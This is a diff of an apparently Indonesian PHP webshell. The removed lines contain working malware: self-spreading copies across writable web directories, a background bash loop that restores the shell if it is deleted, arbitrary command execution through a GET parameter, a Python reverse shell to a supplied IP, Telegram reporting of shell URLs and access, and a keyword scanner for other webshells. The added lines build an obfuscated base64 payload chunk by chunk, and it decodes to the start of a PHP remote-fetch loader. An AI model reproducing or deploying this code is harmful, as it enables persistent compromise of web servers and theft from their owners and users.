-    TIMESTAMP=$(TZ="Asia/Jakarta" date +"%Y-%m-%d %H:%M:%S")
-    if [ ! -f "$SHELL_PATH" ]; then
-        echo "$TIMESTAMP: File dihapus, memulihkan..." >> "$LOG_FILE"
-        echo "$ORIGINAL_CONTENT" > "$SHELL_PATH"
-        chmod 0644 "$SHELL_PATH" 2>/dev/null
-        echo "$TIMESTAMP: File berhasil dipulihkan" >> "$LOG_FILE"
-    else
-        CURRENT_CONTENT=$(cat "$SHELL_PATH" 2>/dev/null)
-        if [ "$CURRENT_CONTENT" != "$ORIGINAL_CONTENT" ]; then
-            echo "$TIMESTAMP: File dimodifikasi, memulihkan..." >> "$LOG_FILE"
-            echo "$ORIGINAL_CONTENT" > "$SHELL_PATH"
-            echo "$TIMESTAMP: File berhasil dipulihkan" >> "$LOG_FILE"
-        fi
-    fi
-    sleep 5
-done
-';
-            @file_put_contents($antidelete_script, $script_content);
-            @chmod($antidelete_script, 0755);
-
-            // Run in background
-            $cmd = "nohup bash " . escapeshellarg($antidelete_script) . " > /dev/null 2>&1 &";
-            @exec($cmd);
-
-            sleep(1); // Wait for process to start
-
-            if (@file_exists($antidelete_pid_file)) {
-                $pid = @trim(@file_get_contents($antidelete_pid_file));
-                echo "<h3>🛡️ Anti-Delete</h3>";
-                echo "<p style='color: #00ff00;'>✅ Anti-Delete berhasil diaktifkan!</p>";
-                echo "<p style='color: #888;'>PID: <code>$pid</code></p>";
-                echo "<p style='color: #888;'>Shell ini akan otomatis di-restore jika dihapus/diubah.</p>";
-            } else {
-                echo "<h3>🛡️ Anti-Delete</h3>";
-                echo "<p style='color: #ff5555;'>❌ Gagal mengaktifkan Anti-Delete</p>";
-            }
-            echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-            exit;
-        }
-
-        if ($action === 'stop') {
-            if (@file_exists($antidelete_pid_file)) {
-                $pid = @trim(@file_get_contents($antidelete_pid_file));
-                if ($pid) {
-                    @exec("kill $pid 2>/dev/null");
-                    @exec("kill -9 $pid 2>/dev/null");
-                }
-                @unlink($antidelete_pid_file);
-                @unlink('/tmp/.antidelete_' . md5($shell_path) . '.sh');
-            }
-            echo "<h3>🛡️ Anti-Delete</h3>";
-            echo "<p style='color: #ffcc00;'>⏹️ Anti-Delete telah dinonaktifkan.</p>";
-            echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-            exit;
-        }
-
-        if ($action === 'status') {
-            echo "<h3>🛡️ Anti-Delete Status</h3>";
-            $is_running = false;
-            $pid = null;
-
-            if (@file_exists($antidelete_pid_file)) {
-                $pid = @trim(@file_get_contents($antidelete_pid_file));
-                if ($pid && @file_exists("/proc/$pid")) {
-                    $is_running = true;
-                }
-            }
-
-            if ($is_running) {
-                echo "<p style='color: #00ff00;'>✅ Status: <b>AKTIF</b> (PID: $pid)</p>";
-                echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1&antidelete=stop')\" style='padding: 12px 20px; background: #aa0000; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px;'>";
-                echo "⏹️ <b>Stop Anti-Delete</b>";
-                echo "</button>";
-            } else {
-                echo "<p style='color: #888;'>⏹️ Status: <b>TIDAK AKTIF</b></p>";
-                echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1&antidelete=start')\" style='padding: 12px 20px; background: #00aa00; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px;'>";
-                echo "🛡️ <b>Aktifkan Anti-Delete</b>";
-                echo "</button>";
-            }
-            echo "<br><br><button onclick=\"openModalWithURL('?defense_shell=1&ajax=1')\" style='padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-            exit;
-        }
-    }
-
-    // Pastikan folder cache ada
-    if (!@is_dir('/tmp/.chache/')) {
-        @mkdir('/tmp/.chache/', 0777, true);
-    }
-
-    // ===== MODE: CHECK BACKUPS =====
-    if (isset($_GET['check_backups'])) {
-        echo "<h3>🔍 Check Backups Status</h3>";
-
-        $existing_links_content = @file_get_contents($link_file_path) ?: '';
-        $all_links = @array_filter(@array_map('trim', @explode("\n", $existing_links_content)));
-
-        if (empty($all_links)) {
-            echo "<p style='color: #ffcc00;'>⚠️ Belum ada backup shell yang tercatat.</p>";
-            echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-            exit;
-        }
-
-        $active_count = 0;
-        $deleted_count = 0;
-        $results = [];
-
-        foreach ($all_links as $link) {
-            // Extract path from URL or local path
-            $path = '';
-            $is_local = false;
-
-            if (strpos($link, 'LOCAL_PATH_ONLY:') === 0) {
-                $path = trim(str_replace('LOCAL_PATH_ONLY:', '', $link));
-                $is_local = true;
-            } elseif (strpos($link, 'http') === 0) {
-                // Convert URL to local path
-                $document_root = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
-                $base_url = get_base_url();
-                $relative = str_replace($base_url, '', $link);
-                $relative = ltrim(urldecode($relative), '/');
-                $path = $document_root . '/' . $relative;
-            }
-
-            if (!empty($path)) {
-                $exists = @file_exists($path);
-                if ($exists) {
-                    $active_count++;
-                    $status = '✅ ACTIVE';
-                    $status_color = '#00ff00';
-                } else {
-                    $deleted_count++;
-                    $status = '❌ DELETED';
-                    $status_color = '#ff4444';
-                }
-                $results[] = [
-                    'link' => $link,
-                    'path' => $path,
-                    'exists' => $exists,
-                    'status' => $status,
-                    'color' => $status_color
-                ];
-            }
-        }
-
-        // Summary
-        echo "<div style='background: #1a1a1a; padding: 10px; border-radius: 4px; margin: 10px 0; border-left: 3px solid #00ff00;'>";
-        echo "<b style='color: #00ff00;'>📊 Summary:</b><br>";
-        echo "• Total Backups: <b>" . count($all_links) . "</b><br>";
-        echo "• Active: <b style='color: #00ff00;'>{$active_count}</b><br>";
-        echo "• Deleted: <b style='color: #ff4444;'>{$deleted_count}</b>";
-        echo "</div>";
-
-        // Detail table
-        echo "<div style='max-height: 300px; overflow-y: auto; background: #000; padding: 10px; border: 1px solid #333;'>";
-        echo "<table style='width: 100%; color: white; border-collapse: collapse; font-size: 11px;'>";
-        echo "<tr><th style='text-align: left; padding: 5px; border-bottom: 1px solid #444;'>Status</th><th style='text-align: left; padding: 5px; border-bottom: 1px solid #444;'>Path/URL</th></tr>";
-
-        foreach ($results as $r) {
-            $display = strlen($r['path']) > 60 ? '...' . substr($r['path'], -57) : $r['path'];
-            echo "<tr>";
-            echo "<td style='padding: 5px; border-bottom: 1px dashed #333; color: {$r['color']};'>{$r['status']}</td>";
-            echo "<td style='padding: 5px; border-bottom: 1px dashed #333;'><code title='{$r['path']}'>{$display}</code></td>";
-            echo "</tr>";
-        }
-        echo "</table></div>";
-
-        echo "<div style='margin-top: 15px; display: flex; gap: 10px;'>";
-        echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1')\" style='padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-        if ($deleted_count > 0) {
-            echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1&respread=1')\" style='padding: 8px 16px; background: #ff6600; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>🔄 Re-spread ({$deleted_count} deleted)</button>";
-        }
-        echo "</div>";
-
-        exit;
-    }
-
-    // ===== MODE: CLEAN ALL =====
-    if (isset($_GET['clean_all'])) {
-        if (!isset($_GET['confirm'])) {
-            echo "<h3>🗑️ Clean All Backups</h3>";
-            echo "<p style='color: #ff4444;'>⚠️ <b>PERINGATAN:</b> Ini akan menghapus SEMUA salinan shell backup!</p>";
-            echo "<p style='color: #888;'>Tindakan ini tidak dapat dibatalkan.</p>";
-
-            echo "<div style='margin-top: 20px; display: flex; gap: 10px;'>";
-            echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1&clean_all=1&confirm=1')\" style='padding: 10px 20px; background: #ff0000; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>🗑️ Ya, Hapus Semua</button>";
-            echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1')\" style='padding: 10px 20px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Batalkan</button>";
-            echo "</div>";
-            exit;
-        }
-
-        // Confirmed - do cleanup
-        echo "<h3>🗑️ Cleaning All Backups...</h3>";
-
-        $existing_links_content = @file_get_contents($link_file_path) ?: '';
-        $all_links = @array_filter(@array_map('trim', @explode("\n", $existing_links_content)));
-
-        $deleted_count = 0;
-        $failed_count = 0;
-
-        foreach ($all_links as $link) {
-            $path = '';
-
-            if (strpos($link, 'LOCAL_PATH_ONLY:') === 0) {
-                $path = trim(str_replace('LOCAL_PATH_ONLY:', '', $link));
-            } elseif (strpos($link, 'http') === 0) {
-                $document_root = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
-                $base_url = get_base_url();
-                $relative = str_replace($base_url, '', $link);
-                $relative = ltrim(urldecode($relative), '/');
-                $path = $document_root . '/' . $relative;
-            }
-
-            if (!empty($path) && @file_exists($path)) {
-                if (@unlink($path)) {
-                    $deleted_count++;
-                } else {
-                    $failed_count++;
-                }
-            }
-        }
-
-        // Clear the log file
-        @file_put_contents($link_file_path, '');
-
-        echo "<div style='background: #1a1a1a; padding: 15px; border-radius: 4px; border-left: 3px solid #00ff00;'>";
-        echo "<p style='color: #00ff00;'>✅ Cleanup selesai!</p>";
-        echo "<p>• File dihapus: <b style='color: #00ff00;'>{$deleted_count}</b></p>";
-        if ($failed_count > 0) {
-            echo "<p>• Gagal dihapus: <b style='color: #ff4444;'>{$failed_count}</b></p>";
-        }
-        echo "<p>• Log file dibersihkan</p>";
-        echo "</div>";
-
-        echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-        exit;
-    }
-
-    // ===== MODE: RE-SPREAD =====
-    if (isset($_GET['respread'])) {
-        echo "<h3>🔄 Re-spread to Deleted Locations</h3>";
-
-        $existing_links_content = @file_get_contents($link_file_path) ?: '';
-        $all_links = @array_filter(@array_map('trim', @explode("\n", $existing_links_content)));
-
-        $respread_count = 0;
-        $failed_count = 0;
-        $new_links = [];
-
-        foreach ($all_links as $link) {
-            $path = '';
-
-            if (strpos($link, 'LOCAL_PATH_ONLY:') === 0) {
-                $path = trim(str_replace('LOCAL_PATH_ONLY:', '', $link));
-            } elseif (strpos($link, 'http') === 0) {
-                $document_root = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
-                $base_url = get_base_url();
-                $relative = str_replace($base_url, '', $link);
-                $relative = ltrim(urldecode($relative), '/');
-                $path = $document_root . '/' . $relative;
-            }
-
-            if (!empty($path)) {
-                if (@file_exists($path)) {
-                    // Already exists, keep in list
-                    $new_links[] = $link;
-                } else {
-                    // Deleted - try to re-spread
-                    $dir = dirname($path);
-                    if (@is_dir($dir) && @is_writable($dir)) {
-                        // Generate new random name
-                        $new_name = generate_random_filename();
-                        $new_path = $dir . '/' . $new_name;
-
-                        if (@copy($current_script_path, $new_path)) {
-                            @chmod($new_path, 0644);
-                            $new_url = get_web_url_from_path($new_path);
-                            $new_links[] = $new_url;
-                            $respread_count++;
-                        } else {
-                            $failed_count++;
-                        }
-                    } else {
-                        $failed_count++;
-                    }
-                }
-            }
-        }
-
-        // Update log file
-        @file_put_contents($link_file_path, implode("\n", $new_links) . "\n");
-
-        echo "<div style='background: #1a1a1a; padding: 15px; border-radius: 4px; border-left: 3px solid #00ff00;'>";
-        echo "<p style='color: #00ff00;'>✅ Re-spread selesai!</p>";
-        echo "<p>• Berhasil re-spread: <b style='color: #00ff00;'>{$respread_count}</b></p>";
-        if ($failed_count > 0) {
-            echo "<p>• Gagal (folder tidak writable): <b style='color: #ff4444;'>{$failed_count}</b></p>";
-        }
-        echo "</div>";
-
-        echo "<div style='margin-top: 15px; display: flex; gap: 10px;'>";
-        echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1')\" style='padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali</button>";
-        echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1&check_backups=1')\" style='padding: 8px 16px; background: #0066cc; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>🔍 Check Status</button>";
-        echo "</div>";
-        exit;
-    }
-
-    // ===== DEFAULT: Show Menu =====
-    if (!isset($_GET['do_spread'])) {
-        echo "<h3>🛡️ Defense Shell</h3>";
-        echo "<div style='padding: 15px; background: #111; border-radius: 8px;'>";
-
-        // Get current stats
-        $existing_links_content = @file_get_contents($link_file_path) ?: '';
-        $all_links = @array_filter(@array_map('trim', @explode("\n", $existing_links_content)));
-        $backup_count = count($all_links);
-
-        echo "<p style='color: #888; margin-bottom: 15px;'>Total backups tercatat: <b style='color: #00ff00;'>{$backup_count}</b></p>";
-
-        echo "<div style='display: flex; flex-direction: column; gap: 10px;'>";
-
-        // Spread button
-        echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1&do_spread=1')\" style='padding: 12px 20px; background: #00aa00; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; text-align: left;'>";
-        echo "📤 <b>Spread Shell</b><br><small style='color: #aaffaa;'>Sebarkan salinan shell ke folder writable</small>";
-        echo "</button>";
-
-        // Check backups button
-        echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1&check_backups=1')\" style='padding: 12px 20px; background: #0066cc; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; text-align: left;'>";
-        echo "🔍 <b>Check Backups</b><br><small style='color: #aaccff;'>Cek status semua salinan (active/deleted)</small>";
-        echo "</button>";
-
-        // Re-spread button
-        echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1&respread=1')\" style='padding: 12px 20px; background: #ff6600; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; text-align: left;'>";
-        echo "🔄 <b>Re-spread</b><br><small style='color: #ffcc99;'>Spread ulang ke lokasi yang sudah dihapus</small>";
-        echo "</button>";
-
-        // Anti-Delete button
-        $antidelete_pid_file = '/tmp/.antidelete_' . md5($current_script_path) . '.pid';
-        $antidelete_running = false;
-        if (@file_exists($antidelete_pid_file)) {
-            $pid = @trim(@file_get_contents($antidelete_pid_file));
-            if ($pid && @file_exists("/proc/$pid")) {
-                $antidelete_running = true;
-            }
-        }
-        $antidelete_status = $antidelete_running ? "<span style='color:#0f0;'>● AKTIF</span>" : "<span style='color:#888;'>○ OFF</span>";
-        echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1&antidelete=status')\" style='padding: 12px 20px; background: #6600aa; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; text-align: left;'>";
-        echo "🛡️ <b>Anti-Delete</b> {$antidelete_status}<br><small style='color: #ddaaff;'>Auto-restore jika shell dihapus/diubah</small>";
-        echo "</button>";
-
-        // Clean all button
-        echo "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1&clean_all=1')\" style='padding: 12px 20px; background: #aa0000; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; text-align: left;'>";
-        echo "🗑️ <b>Clean All</b><br><small style='color: #ffaaaa;'>Hapus semua salinan backup</small>";
-        echo "</button>";
-
-        echo "</div></div>";
-        exit;
-    }
-
-    // ===== MODE: DO SPREAD (original functionality) =====
-
-    $writable_paths = [];
-    $spread_links = [];
-    $max_depth = 5;
-    $base_url = get_base_url();
-    $max_spread_limit = 20;
-    $spread_counter = 0;
-
-    $existing_links_content = @file_get_contents($link_file_path) ?: '';
-    $existing_links_array = @array_filter(@array_map('trim', @explode("\n", $existing_links_content)));
-
-    $existing_web_links_count = @count(@array_filter($existing_links_array, function($link) {
-        return @strpos($link, 'http') === 0 || @strpos($link, 'https') === 0;
-    }));
-
-    $remaining_limit = $max_spread_limit - $existing_web_links_count;
-    if ($remaining_limit < 0) {
-        $remaining_limit = 0;
-    }
-
-
-    function scan_writable_dirs($dir, $current_depth = 0) {
-        global $writable_paths, $max_depth, $current_script_path, $spread_links, $base_url, $spread_counter, $remaining_limit, $existing_links_array;
-
-        if ($spread_counter >= $remaining_limit) return;
-
-        if ($current_depth >= $max_depth) return;
-
-        $document_root = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
-
-        $items = @scandir($dir);
-        if (!$items) return;
-
-        foreach ($items as $item) {
-
-            if ($spread_counter >= $remaining_limit) return;
-
-            if ($item == '.' || $item == '..') continue;
-
-            if (@is_dir($dir . DIRECTORY_SEPARATOR . $item) && @strpos($item, '.') === 0) {
-                continue;
-            }
-
-            $path = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
-
-            if (@is_dir($path)) {
-                if (@is_writable($path)) {
-
-                    if ($spread_counter < $remaining_limit) {
-                        $writable_paths[] = $path;
-
-                        $random_name = generate_random_filename();
-                        $target_shell_path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $random_name;
-
-                        if (@realpath($target_shell_path) == @realpath($current_script_path)) continue;
-
-                        if (@copy($current_script_path, $target_shell_path)) {
-                            @chmod($target_shell_path, 0644);
-
-                            $current_link = get_web_url_from_path($target_shell_path);
-
-                            if (@strpos($current_link, 'http') === 0 || @strpos($current_link, 'https') === 0 && !@in_array($current_link, $existing_links_array)) {
-                                $spread_links[] = $current_link;
-                                $spread_counter++;
-                            } else if (@strpos($current_link, 'http') !== 0) {
-                                $spread_links[] = "LOCAL_PATH_ONLY: " . $target_shell_path;
-                            } else {
-                                $spread_links[] = $current_link;
-                            }
-                        }
-                    }
-                }
-
-                scan_writable_dirs($path, $current_depth + 1);
-            }
-        }
-    }
-
-    $start_dir = $_SERVER['DOCUMENT_ROOT'] ?? @getcwd();
-
-    $output_html = "<h3>🛡️ Defense Shell - Spread Mode</h3>";
-
-    if (@is_dir($start_dir) && @is_readable($start_dir)) {
-
-        if ($remaining_limit > 0) {
-           scan_writable_dirs(@rtrim($start_dir, DIRECTORY_SEPARATOR));
-        }
-
-        $all_spread_links = @array_values(@array_unique(@array_merge($existing_links_array, $spread_links)));
-
-        $pure_web_links = @array_filter($all_spread_links, function($link) {
-            return @strpos($link, 'http') === 0 || @strpos($link, 'https') === 0;
-        });
-
-        if (count($pure_web_links) > $max_spread_limit) {
-            $pure_web_links = array_slice($pure_web_links, 0, $max_spread_limit);
-            $log_links_temp = array_filter($all_spread_links, function($link) {
-                 return @strpos($link, 'LOCAL_PATH_ONLY:') === 0;
-            });
-            $all_spread_links = @array_merge($pure_web_links, $log_links_temp);
-        }
-
-        $newly_spread_links = @array_filter($spread_links, function($link) use ($existing_links_array) {
-           return (@strpos($link, 'http') === 0 || @strpos($link, 'https') === 0)
-                  && !@in_array($link, $existing_links_array);
-        });
-        $newly_spread_links_count = @count($newly_spread_links);
-        $link_count = @count($pure_web_links);
-
-
-        $log_links_content_for_file = implode("\n", $all_spread_links);
-
-        $spread_successful = false;
-
-        $is_links_logged = !empty($log_links_content_for_file)
-                            ? @file_put_contents($link_file_path, $log_links_content_for_file . "\n", @LOCK_EX)
-                            : (empty($existing_links_array) ? true : false);
-
-        if ($is_links_logged !== false) {
-             $spread_successful = true;
-        }
-
-        $collected_web_links = [];
-
-        if (!empty($pure_web_links)) {
-            foreach ($pure_web_links as $link) {
-                 $collected_web_links[] = "<a href=\"{$link}\">{$link}</a>";
-            }
-        }
-
-        $message_content = @implode("\n", $collected_web_links);
-
-        if (!empty($message_content)) {
-            $initial_report = "\u{1F6E1} <b>DEFENSE SHELL SPREAD REPORT</b>\n";
-            $initial_report .= "Shell URL: <a href=\"" . get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/') . "\">" . get_base_url() . "</a>\n";
-            $initial_report .= "Semua Link Unik Ditemukan (Max {$max_spread_limit}): " . $link_count . "\n";
-            $initial_report .= "=================================\n";
-
-            send_telegram_report($initial_report . $message_content, 'HTML');
-        }
-
-        if ($spread_successful) {
-
-            $output_html .= "<p style='color: #00ff7f;'>✅ File Spread Selesai!</p>";
-
-            if ($link_count > 0) {
-                 $real_link_path = htmlspecialchars(@realpath($link_file_path));
-
-                 $limit_message = ($max_spread_limit <= $existing_web_links_count)
-                    ? "Batas maksimal {$max_spread_limit} sudah tercapai. Total link unik di log: {$link_count}."
-                    : "Webshell berhasil disebar ke {$newly_spread_links_count} lokasi baru! Total link unik di log: {$link_count} (Batas Max: {$max_spread_limit}).";
-
-                 $output_html .= "<p style='color: #00ff7f;'>{$limit_message}</p>";
-                 $output_html .= "<p style='color: #ffcc00;'>Daftar URL lengkap tersedia di: <code>" . $real_link_path . "</code></p>";
-
-                 $output_html .= "<br><p style='color: #00ff7f; margin-top: 15px;'>Salin Semua URL Berikut:</p>";
-                 $output_html .= "<textarea id='spreadLinksContent' style='width: 100%; min-height: 200px; background: #111; color: #fff; border: 1px solid #00ff00ff; padding: 10px; font-size: 12px; font-family: monospace;'>";
-
-                 $output_html .= @htmlspecialchars(@trim(@implode("\n", $pure_web_links)));
-
-                 $output_html .= "</textarea>";
-            } else {
-                 $output_html .= "<p style='color: #ffcc00;'>⚠️ Penyebaran file GAGAL atau TIDAK ADA direktori yang dapat ditulisi di bawah Document Root dalam batas kedalaman ({$max_depth}).</p>";
-            }
-
-        } else {
-             $output_html .= "<p class='error' style='color: #ff3333;'>❌ ERROR: Gagal menulis file log.</p>";
-        }
-    } else {
-         $output_html .= "<p class='error' style='color: #ff3333;'>❌ ERROR: Tidak dapat membaca DOCUMENT_ROOT (" . htmlspecialchars($start_dir) . "). Pemindaian dibatalkan.</p>";
-    }
-
-    $output_html .= "<button onclick=\"openModalWithURL('?defense_shell=1&ajax=1')\" style='margin-top: 15px; padding: 8px 16px; background: #333; color: #fff; border: none; border-radius: 4px; cursor: pointer;'>← Kembali ke Menu</button>";
-
-    echo $output_html;
-
-    exit;
-}
-
-if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
-    @ob_start(); @system($_GET['cmd'] . ' 2>&1'); $term_output = @ob_get_clean(); $show_terminal = true;
-} else { $term_output = ""; $show_terminal = isset($_GET['terminal']); }
-
-// Background scan - start scan process
-if (isset($_GET['shell_finder_bg_start'])) {
-    @header('Content-Type: application/json');
-
-    $scan_id = uniqid('scan_');
-    $depth = isset($_GET['depth']) ? intval($_GET['depth']) : 5;
-    $start_dir = isset($_GET['start_dir']) ? $_GET['start_dir'] : ($_SERVER['DOCUMENT_ROOT'] ?? @getcwd());
-
-    $scan_data = [
-        'id' => $scan_id,
-        'status' => 'running',
-        'depth' => $depth,
-        'start_dir' => $start_dir,
-        'started_at' => time(),
-        'scanned_dirs' => 0,
-        'scanned_files' => 0,
-        'found_shells' => [],
-        'current_path' => '',
-        'completed' => false
-    ];
-
-    $scan_file = sys_get_temp_dir() . '/.shell_scan_' . $scan_id . '.json';
-    @file_put_contents($scan_file, json_encode($scan_data));
-
-    echo json_encode(['scan_id' => $scan_id, 'status' => 'started']);
-    exit;
-}
-
-// Background scan - do actual scanning (called via AJAX chunks)
-if (isset($_GET['shell_finder_bg_process'])) {
-    @header('Content-Type: application/json');
-
-    $scan_id = $_GET['scan_id'] ?? '';
-    $scan_file = sys_get_temp_dir() . '/.shell_scan_' . $scan_id . '.json';
-
-    if (!@file_exists($scan_file)) {
-        echo json_encode(['error' => 'Scan not found']);
-        exit;
-    }
-
-    $scan_data = json_decode(@file_get_contents($scan_file), true);
-
-    if ($scan_data['completed']) {
-        echo json_encode($scan_data);
-        exit;
-    }
-
-    // Do the actual scan
-    $suspicious_keywords = ['eval(', 'file_get_contents(', 'curl_exec(', 'base64_decode(', 'system(', 'shell_exec(', 'passthru(', 'assert(', 'include(', 'require(', 'fopen(', 'readfile(', 'exec(', 'proc_open(', 'popen(', 'create_function(', 'unserialize(', 'call_user_func(', 'file_put_contents(', 'unlink(', 'rmdir(', 'symlink(', '$_POST', '$_GET', '$_REQUEST', '$_COOKIE', '$_FILES'];
-    $found_shells = [];
-    $scanned_dirs_count = 0;
-    $scanned_files_count = 0;
-    $max_depth = $scan_data['depth'];
-    $current_scan_path = '';
-
-    // Recursive scan function with progress tracking
-    $scan_func = function($dir, $current_depth = 0) use (&$scan_func, &$suspicious_keywords, &$found_shells, &$scanned_dirs_count, &$scanned_files_count, &$max_depth, &$current_scan_path, $scan_file, $scan_id) {
-        global $current_script_path, $source_file_content;
-
-        if ($max_depth > 0 && $current_depth >= $max_depth) return;
-
-        $scanned_dirs_count++;
-        $current_scan_path = $dir;
-
-        // Update progress setiap 10 folder
-        if ($scanned_dirs_count % 10 == 0) {
-            $progress_data = [
-                'id' => $scan_id,
-                'status' => 'running',
-                'scanned_dirs' => $scanned_dirs_count,
-                'scanned_files' => $scanned_files_count,
-                'found_count' => count($found_shells),
-                'current_path' => $current_scan_path,
-                'completed' => false
-            ];
-            @file_put_contents($scan_file, json_encode($progress_data));
-        }
-
-        $items = @scandir($dir);
-        if (!$items) return;
-
-        foreach ($items as $item) {
-            if ($item == '.' || $item == '..') continue;
-
-            $path = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
-
-            if (@is_dir($path)) {
-                if (@realpath($path) != @realpath(dirname($path))) {
-                    $scan_func($path, $current_depth + 1);
-                }
-            } elseif (@preg_match('/\.(php|phtml|asp|aspx)$/i', $item)) {
-                $scanned_files_count++;
-                $content = @file_get_contents($path);
-
-                if (!empty($source_file_content) && $content === $source_file_content) {
-                    continue;
-                }
-
-                $resolved_path = @realpath($path) ?: $path;
-                if (!empty($current_script_path) && $resolved_path === $current_script_path) {
-                    continue;
-                }
-
-                if ($content !== false && $content !== '') {
-                    foreach ($suspicious_keywords as $keyword) {
-                        if (@stripos($content, $keyword) !== false) {
-                            $web_url = get_web_url_from_path($resolved_path);
-                            $found_shells[] = ['url' => $web_url, 'match' => $keyword, 'path' => $path];
-                            break;
-                        }
-                    }
-                }
-            }
-        }
-    };
-
-    $start_dir = @realpath($scan_data['start_dir']) ?: $scan_data['start_dir'];
-    $start_time = microtime(true);
-
-    if (@is_dir($start_dir) && @is_readable($start_dir)) {
-        $scan_func(@rtrim($start_dir, DIRECTORY_SEPARATOR));
-    }
-
-    $end_time = microtime(true);
-
-    // Save final results
-    $final_data = [
-        'id' => $scan_id,
-        'status' => 'completed',
-        'depth' => $max_depth,
-        'start_dir' => $start_dir,
-        'scanned_dirs' => $scanned_dirs_count,
-        'scanned_files' => $scanned_files_count,
-        'found_shells' => $found_shells,
-        'found_count' => count($found_shells),
-        'duration' => round($end_time - $start_time, 2),
-        'completed' => true,
-        'completed_at' => time()
-    ];
-
-    @file_put_contents($scan_file, json_encode($final_data));
-
-    echo json_encode($final_data);
-    exit;
-}
-
-// Background scan - check progress
-if (isset($_GET['shell_finder_bg_status'])) {
-    @header('Content-Type: application/json');
-
-    $scan_id = $_GET['scan_id'] ?? '';
-    $scan_file = sys_get_temp_dir() . '/.shell_scan_' . $scan_id . '.json';
-
-    if (!@file_exists($scan_file)) {
-        echo json_encode(['error' => 'Scan not found', 'completed' => true]);
-        exit;
-    }
-
-    $scan_data = json_decode(@file_get_contents($scan_file), true);
-    echo json_encode($scan_data);
-    exit;
-}
-
-if (isset($_POST['reverse_shell'])) {
-    $ip = $_POST['ip']; $port = intval($_POST['port']);
-    if (!filter_var($ip, FILTER_VALIDATE_IP) || $port < 1 || $port > 65535) { echo "Invalid IP"; exit; }
-    @ob_clean();
-    $cmd = "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" . escapeshellarg($ip) . "\"," . escapeshellarg($port) . "\"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")' 2>&1";
-    @passthru($cmd); echo "Attempting connection..."; exit;
-}
-
- $rootDir = @getcwd();
- $currentDir = @isset($_GET['dir']) ? $_GET['dir'] : $rootDir;
- $currentDir = @realpath($currentDir) ? @realpath($currentDir) : $currentDir;
-if (!@is_dir($currentDir)) $currentDir = $rootDir;
-@chdir($currentDir);
-
-// Send access report on first load only (once per session)
-if (!isset($_SESSION['telegram_notified'])) {
-    $_SESSION['telegram_notified'] = true;
-    send_telegram_report(get_initial_info());
-}
+$z = "";
+$z .= "PD9w";
+$z .= "aHAN";
+$z .= "CnNl";
+$z .= "c3Np";
+$z .= "b25f";
+$z .= "c3Rh";
+$z .= "cnQo";
+$z .= "KTsN";
+$z .= "Cg0K";
+$z .= "ZnVu";
+$z .= "Y3Rp";
+$z .= "b24g";
+$z .= "Z2V0";
+$z .= "dXJs";
+$z .= "c2lu";
+$z .= "Zm8o";
+$z .= "JHVy";
+$z .= "bCkg";
+$z .= "ew0K";
+$z .= "ICAg";
+$z .= "IGlm";
+$z .= "IChm";
+$z .= "dW5j";
+$z .= "dGlv";
+$z .= "bl9l";
+$z .= "eGlz";
+$z .= "dHMo";
+$z .= "J2N1";
+$z .= "cmxf";
+$z .= "ZXhl";
+$z .= "Yycp";
+$z .= "KSB7";
+$z .= "DQog";
+$z .= "ICAg";
+$z .= "ICAg";
+$z .= "ICRj";
+$z .= "b25u";
+$z .= "ID0g";
+$z .= "Y3Vy";
+$z .= "bF9p";
+$z .= "bml0";
+$z .= "KCR1";
+$z .= "cmwp";
+$z .= "Ow0K";
+$z .= "ICAg";
